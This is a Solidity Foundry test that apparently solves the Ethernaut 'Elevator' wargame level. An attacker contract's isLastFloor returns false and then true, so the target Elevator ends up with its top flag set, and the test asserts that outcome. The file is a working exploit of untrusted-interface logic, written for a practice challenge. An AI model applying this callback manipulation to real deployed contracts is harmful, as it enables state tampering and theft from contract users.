pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Elevator.sol";

contract Boom is Building {
    bool private called;

    function isLastFloor(uint256) external returns (bool) {
        // return false initially
        if (!called) {
            called = true;
            return false;
        } else return true;
    }

    function attack(Elevator _target) external {
        _target.goTo(0);
    }
}

contract ASMElevator is Test {
    Elevator target;

    function setUp() public {
        target = new Elevator();
    }

    function testAttackElevator() public {
        Boom boom = new Boom();
        boom.attack(target);
        assertEq(target.top(), true);
    }
}
